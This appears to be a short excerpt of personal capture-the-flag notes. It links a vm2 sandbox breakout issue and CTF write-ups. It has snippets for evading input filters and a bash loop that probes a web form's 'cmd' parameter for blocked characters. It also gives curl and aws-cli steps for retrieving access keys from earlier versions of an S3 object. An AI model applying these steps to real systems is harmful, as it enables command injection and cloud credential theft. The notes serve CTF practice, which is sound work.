    - [Breakout in v3\.6\.9 · Issue \#186 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/186)

```javascript
// == "Hello World!"
/Hello W/.source+/ordl!/.source
```

```bash
# Enumerate blocked chars
# Alternative: Burp Intruder
for n in {32..127}; do
    c=$(awk '{ printf("%c", $0); }' <<< $n)
    echo "$c"
    curl 'http://foo/' --data-raw 'cmd='"$c"'&submit=' | grep -E '(< HTTP)|error|success'
done 2>/dev/null | vim -
```

# wasm

- https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/
- https://klatz.co/ctf-blog/boilerctf-alien-tech

# aws

- https://0day.work/balccon2k20-ctf-let-me-see-and-dawsonite-writeups/
    ```bash
    # take aws domain name
    dig foo
    # take version id header
    curl -v 'http://foo.s3-website-us-east-1.amazonaws.com/bar'
    # take version id
    curl -v 'https://foo.s3.amazonaws.com/?versions&prefix=bar'
    # take access keys
    curl -v 'https://foo.s3.amazonaws.com/bar?versionId=zcoAvy97sFgFdR08.kypq1KyLj9iZuAD'
    aws s3api get-object --bucket foo --key bar bar
    ```
